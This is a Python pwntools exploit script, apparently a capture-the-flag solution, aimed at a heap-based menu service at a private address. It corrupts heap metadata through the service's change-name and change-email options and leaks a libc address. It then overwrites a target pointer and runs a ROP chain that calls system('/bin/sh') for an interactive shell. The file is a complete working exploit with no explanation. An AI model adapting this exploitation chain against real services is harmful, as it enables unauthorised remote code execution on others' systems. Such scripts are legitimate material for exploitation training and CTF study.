#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "10.211.55.6"
port = 8888

r = remote(host,port)


def changename(name):
    r.recvuntil(">")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(name)

def changemail(email):
    r.recvuntil(">")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(email)

def process():
    r.recvuntil(">")
    r.sendline("5")

changename("a"*0x87)
changemail("b"*0xb7)
process()
changename("a"*0xf0 + p64(0) + p64(0x21) + p64(0)*3 + p64(0x21) )
ptr = 0x602038
changemail("b"*0xb0 + p64(0x150))
process()
changename("")
process()
changename("a"*0x80 + p64(0) + p64(0x91+0x70) +"b"*0xf0 + p64(0) + p64(0x21) + "c"*0x10 + p64(0) + p64(0x21) + "b"*0x90)
changemail("")
process()
changemail("f"*0x60)
target = 0x602043 + 0x18
process()
changemail("")
changename("a"*0x80 + p64(0) + p64(0x71) + p64(0x60201d)[:-1]  )
process()
changename("")
changemail(p64(0) + p64(0x1d1) + p64(0) +p64(target-0x10) + "a"*0x40)
process()
changename("\x00"*0x80 + p64(0) + p64(0x71) + p64(0) + p64(target-0x10))
changemail(p64(0)*3 + p64(0x51) + p64(0) + p64(target-0x10) + "b"*0x30)
process()
changename("a"*0x70)
process()
changename("")
process()
changename("a"*0x40)
changemail("")
process()
r.recvuntil("Round:")
lib = (int(r.recvuntil("\n")[:-1]) + 0x100000000)*0x100
libc_ptr = 0x7f0000000000 + 0x78 + lib
print hex(libc_ptr)
libc = libc_ptr - 0x3c3c78 
fake = libc + 0x3c3aed
changemail(p64(0) + p64(0x71) + p64(fake) + p64(0))
process()
changename("")
changemail("")
process()
add_rsp_100 = libc + 0x8dc89
sh = libc + 0x18c177
pop_rdi = 0x0000000000401213
ret = 0x00000000004007a9 
system = libc + 0x45390
changename("a"*0x60)
changemail(("b"*3  + p64(add_rsp_100)*3).ljust(0x60,"\x00"))
process()
changename(p64(ret)*0x20 + p64(pop_rdi) + p64(sh) + p64(system))
r.interactive()
